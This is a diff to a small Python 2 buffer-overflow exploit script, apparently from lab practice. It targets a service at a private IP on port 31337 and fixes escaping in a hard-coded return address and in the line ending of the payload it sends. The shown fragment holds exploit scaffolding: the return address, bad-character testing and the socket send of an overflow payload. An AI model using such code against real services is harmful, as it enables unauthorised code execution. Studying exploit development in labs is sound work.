@@ -4,7 +4,7 @@ from time import sleep
 ip="192.168.1.59"
 port=31337
 #addr =080414C3
-addr="xC3x14x04x08"
+addr="\xC3\x14\x04\x08"
 
 #badchar_test = "" 			#start with empty string
 #badchars = [0x00, 0x0A]			#every time bad...
@@ -42,7 +42,7 @@ try:
 	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 	s.connect((ip,port))
 	print "Fuzzing with "+str(len(bof))+" Characters"
-	s.send(bof + 'nr')
+	s.send(bof + '\r\n')
 	s.recv(1024)
 	s.close()
 except:
